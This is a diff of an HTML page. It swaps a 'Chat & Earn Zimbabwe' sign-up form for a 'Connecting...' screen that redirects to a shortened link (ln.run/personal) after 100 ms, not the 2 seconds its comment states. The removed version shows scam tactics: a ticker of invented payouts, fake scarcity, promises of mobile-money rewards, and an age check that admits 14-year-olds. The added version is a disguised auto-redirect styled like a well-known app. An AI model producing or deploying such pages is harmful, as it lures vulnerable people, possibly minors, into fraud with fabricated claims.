@@ -3,107 +3,64 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Chat & Earn zimbabwe</title>
+<title>Connecting...</title>
 
 <style>
 body{
 margin:0;
-font-family:Arial, sans-serif;
-background:#0d0d0d;
+background:#000;
 color:#fff;
-}
-
-.container{
-max-width:400px;
-margin:auto;
-padding:20px;
-}
-
-.header{
+font-family:Arial, sans-serif;
 display:flex;
+justify-content:center;
 align-items:center;
-margin-bottom:20px;
+height:100vh;
+flex-direction:column;
+overflow:hidden;
 }
 
+/* LOGO STYLE */
 .logo{
-width:45px;
-height:45px;
-border-radius:10px;
-background:#ffcc00;
-margin-right:10px;
-}
-
-.title{
-font-size:18px;
+font-size:28px;
 font-weight:bold;
+margin-bottom:20px;
+background:linear-gradient(90deg,#25f4ee,#fe2c55);
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
 }
 
-.card{
-background:#1a1a1a;
-padding:20px;
-border-radius:15px;
-box-shadow:0 5px 20px rgba(0,0,0,0.5);
-text-align:center;
-}
-
-h1{
-font-size:20px;
-margin-bottom:10px;
-}
-
-p{
-font-size:14px;
-color:#ccc;
-}
-
-/* INPUT */
-input{
-width:100%;
-padding:12px;
-margin-top:10px;
-border-radius:8px;
-border:none;
-outline:none;
-font-size:14px;
-}
-
-/* BUTTON */
-button{
-width:100%;
-padding:14px;
-margin-top:15px;
-border:none;
+/* LOADER BAR */
+.loader{
+width:200px;
+height:4px;
+background:#222;
 border-radius:10px;
-background:#ffcc00;
-color:#000;
-font-weight:bold;
-font-size:15px;
-cursor:pointer;
+overflow:hidden;
 }
 
-button:disabled{
-opacity:0.6;
-cursor:not-allowed;
+.bar{
+height:100%;
+width:0%;
+background:linear-gradient(90deg,#25f4ee,#fe2c55);
+animation:load 2s linear forwards;
 }
 
-.trust{
+@keyframes load{
+0%{width:0%;}
+100%{width:100%;}
+}
+
+/* TEXT */
+.text{
 margin-top:15px;
-font-size:12px;
+font-size:14px;
 color:#aaa;
+animation:fade 1s infinite alternate;
 }
 
-.live{
-margin-top:15px;
-font-size:13px;
-color:#00ffcc;
-line-height:1.6;
-}
-
-.error{
-color:#ff4d4d;
-font-size:12px;
-margin-top:8px;
-display:none;
+@keyframes fade{
+from{opacity:0.5;}
+to{opacity:1;}
 }
 
 </style>
@@ -111,85 +68,20 @@ display:none;
 
 <body>
 
-<div class="container">
+<div class="logo">Connecting...</div>
 
-<div class="header">
-<div class="logo"></div>
-<div class="title">Chat & Earn Zimbabwe</div>
+<div class="loader">
+<div class="bar"></div>
 </div>
 
-<div class="card">
-
-<h1>Start Chatting & Earn 💬</h1>
-
-<p>
-Sign up to chat with international users and receive rewards directly to your EcoCash account.
-</p>
-
-<input type="text" id="name" placeholder="Enter your name">
-<input type="text" id="age" placeholder="Enter your age">
-
-<div class="error" id="error">Please enter a valid name and age (15+)</div>
-
-<button onclick="startNow()">CREATE ACCOUNT</button>
-
-<div class="trust">
-✔ No experience needed <br>
-✔ Works on any phone <br>
-✔ Payments via MTN MoMo
-</div>
-
-<div class="live">
-⚡ 12 chatting spots left today <br>
-<span id="liveText">Ama just earned GHS 320</span>
-</div>
-
-</div>
-
-</div>
+<div class="text">Please wait while we match you...</div>
 
 <script>
 
-// 🔥 LIVE ROTATION
-const messages = [
-"Ama just earned $320",
-"Kofi received payment today",
-"Kwame just made  $210",
-"Akosua earned $150 today",
-"Yaw just joined and got paid"
-];
-
-let index = 0;
-
-function updateLive(){
-index = (index + 1) % messages.length;
-document.getElementById("liveText").innerText = messages[index];
-}
-
-setInterval(updateLive, 2500);
-
-
-// 🚀 VALIDATION + REDIRECT
-function startNow(){
-
-let name = document.getElementById("name").value.trim();
-let age = document.getElementById("age").value.trim();
-
-if(name === "" || age === "" || isNaN(age) || age < 14){
-document.getElementById("error").style.display = "block";
-return;
-}
-
-document.getElementById("error").style.display = "none";
-
-const btn = document.querySelector("button");
-btn.innerText = "Creating account...";
-btn.disabled = true;
-
+// ⏳ REDIRECT AFTER 2 SECONDS
 setTimeout(function(){
 window.location.href="https://ln.run/personal";
-}, 1200);
-}
+}, 100);
 
 </script>
 
